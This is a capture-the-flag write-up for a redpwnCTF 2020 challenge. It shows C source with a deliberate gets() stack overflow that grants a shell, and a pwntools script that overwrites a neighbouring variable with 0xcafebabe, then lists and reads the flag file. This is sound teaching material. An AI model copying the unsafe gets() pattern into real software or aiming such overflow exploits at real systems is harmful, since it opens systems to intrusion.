#### Description
>The coffers keep getting stronger! You'll need to use the source, Luke.

>nc 2020.redpwnc.tf 31255
### Solution
We get an executable and it's source code:
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);

  if(code == 0xcafebabe) {
    system("/bin/sh");
  }
}
```

We can see that there's a buffer overflow vulnerability on `gets(name)`, but in order to get the a shell we need to overwrite the value from `code` to be `0xcafebabe`.

We can fill the `name` buffer with `AAAABBBBCCCCDDDDEEEEFFFF` and everything we add from here it will get into `code`. Just adding `/xca/xfe/xba/xbe` won't work, we have to provide the bytes as little endian.

We'll get shell using the `pwn` module and sending the payload as it follows:
```python
import pwn

con = pwn.remote('2020.redpwnc.tf', 31255)

con.recv()
con.recv()

exploit = b'AAAABBBBCCCCDDDDEEEEFFFF' + pwn.p32(0xcafebabe)
con.sendline(exploit)

con.sendline('ls')
ls = con.recv()
print(ls)

if b'flag.txt' in ls:
    con.sendline('cat flag.txt')
    print(con.recv().decode('utf-8'))

con.close()
```

`pwn.p32(0xcafebabex)` will make our payload to work for little endian.
